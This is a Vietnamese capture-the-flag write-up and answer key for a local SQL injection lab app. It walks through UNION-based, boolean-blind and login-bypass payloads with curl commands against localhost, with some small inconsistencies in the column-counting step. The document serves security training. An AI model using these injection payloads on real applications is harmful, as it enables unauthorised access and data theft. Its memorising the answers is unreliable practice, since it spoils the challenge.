# Hướng dẫn khai thác từng bài — MiniStore SQLi CTF (bản rút gọn)

> ⚠️ Tài liệu writeup/đáp án — chỉ dùng trong môi trường lab được cấp phép.
> Giả sử app chạy tại `http://127.0.0.1:8080` (đổi lại nếu bạn deploy port khác).

## Bước 0 — Khởi động

```bash
docker compose up --build
```

Hoặc không dùng Docker: `./run.sh` (app ở cổng 5000).

Script tự động hoá toàn bộ các bước dưới đây:
```bash
pip install requests
python3 exploit.py all --base http://127.0.0.1:8080
```

> **Lưu ý:** `?q=`, `?category=`, `?sort=` ở trang chủ là mồi nhử, đã được
> tham số hoá an toàn. Chỉ `/products?id=`, `/check?username=` và `/login`
> mới chứa lỗ hổng thật.

---

## UNION-based (`/products?id=`)

Ứng dụng không hiển thị lỗi SQL (đã tắt debug), nên dò dựa vào hành vi trang.

**Bước 1 — dò số cột bằng `ORDER BY`** (6 cột — ID, Tên, Danh mục, Giá, Mô tả — khớp giao diện):
```
?id=0 UNION SELECT 1,2,3,4,5,6
```
→ Nhận được 1 dòng kết quả mới (1,2,3,4,5,6) ⇒ đúng 6 cột.

**Bước 2 — liệt kê cấu trúc CSDL (SQLite):**
```
?id=0 UNION SELECT 1, name, sql, 1, 1, 1 FROM sqlite_master WHERE type='table'
```

**Bước 3 — rút flag:**
```
?id=0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'
```
```bash
curl -s "http://127.0.0.1:8080/products" \
  --data-urlencode "id=0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'" -G
```
→ Flag hiện trong cột "Mô tả".

---

## Boolean-based Blind (`/check?username=`)

Endpoint chỉ trả TAKEN / AVAILABLE — không lộ dữ liệu, không lộ lỗi.

**Bước 1 — xác nhận injection:**
```
?username=admin' AND '1'='1     → TAKEN
?username=admin' AND '1'='2     → AVAILABLE
```

**Bước 2 — dò độ dài flag qua dấu hiệu đúng/sai bằng `OR`:**
```
?username=nosuchuser' OR ((SELECT length(flag) FROM flags WHERE code='boolean_blind') >= 10) -- 
```

**Bước 3 — dò từng ký tự bằng SQL (binary search thủ công)**, nhận biết
TAKEN/AVAILABLE qua kết quả trả về của mỗi request.
 
Payload chung để kiểm tra 1 ký tự tại 1 vị trí:
```
?username=nosuchuser' OR ((SELECT unicode(substr(flag,<vị_trí>,1)) FROM flags WHERE code='boolean_blind') > <mốc_so_sánh>) -- 
```
- TAKEN ⇒ ký tự tại `<vị_trí>` có mã ASCII **lớn hơn** `<mốc_so_sánh>`.
- AVAILABLE ⇒ ký tự đó **nhỏ hơn hoặc bằng** mốc.
Cứ đổi `<mốc_so_sánh>` theo kiểu chia đôi khoảng 32–126 (ký tự in được)
cho đến khi chỉ còn đúng 1 giá trị — đó là mã ASCII của ký tự tại vị trí
đang dò. Tăng `<vị_trí>` lên 1 (`substr(flag,2,1)`, `substr(flag,3,1)`...)
để dò tiếp các ký tự sau.

---

## Authentication Bypass (`/login`)

Username = `admin' -- ` (có dấu cách sau `--`), mật khẩu bất kỳ → phần kiểm tra mật khẩu bị comment bỏ → đăng nhập admin.

```bash
curl -s -i -X POST http://127.0.0.1:8080/login \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x" | grep -i location
```
→ Redirect `/dashboard`, trang hiển thị flag vì `role == 'admin'`.

---

## Bảng tổng kết

| Kỹ thuật | Endpoint | Payload tiêu biểu |
|----------|----------|--------------------|
| UNION-based | `/products?id=` | `0 UNION SELECT 1,'x','x',1,flag,'x' FROM flags WHERE code='union'` |
| Boolean-based Blind | `/check?username=` | `nosuchuser' OR ((SELECT unicode(substr(flag,1,1)) FROM flags WHERE code='boolean_blind')>70) -- ` |
| Authentication Bypass | `/login` | `admin' -- ` |